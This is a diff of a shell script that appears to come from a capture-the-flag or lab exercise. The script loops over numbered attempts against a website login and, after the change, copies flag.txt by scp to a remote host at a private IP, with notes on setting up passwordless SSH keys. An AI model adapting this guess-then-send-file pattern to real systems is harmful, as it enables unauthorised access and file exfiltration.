@@ -2,8 +2,7 @@
 HOST=192.168.0.107 #ip
 PORT=8000 #port
 INTERVAL=2 #seconds
-USER="ubuntu" #ssh username
-PASS="pass" #ssh password
+USER="ubuntu" #ssh username. User that flag will be sent
 NUM=0; #starting
 MAX_NUM=5; #end
 USERNAME=username; #username for website
@@ -38,11 +37,14 @@ fi
 sleep "$INTERVAL"
 done
 
-#change this--------
-#scp flag.txt $USER@$HOST:/home/$USER/Desktop/flag.txt -
+echo "flag sent"
+scp ~/flag.txt "$USER"@"$HOST":~/Desktop/
 
-while true; do
-	echo "flag sent"
-sleep "$INTERVAL"
 done
 
+
+
+#notes.
+#Remember to add these so ssh does not ask for password:
+#ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -C "ubuntu@$(hostname)"
+#ssh-copy-id -i ~/.ssh/id_ed25519.pub kayttaja@192.168.1.50
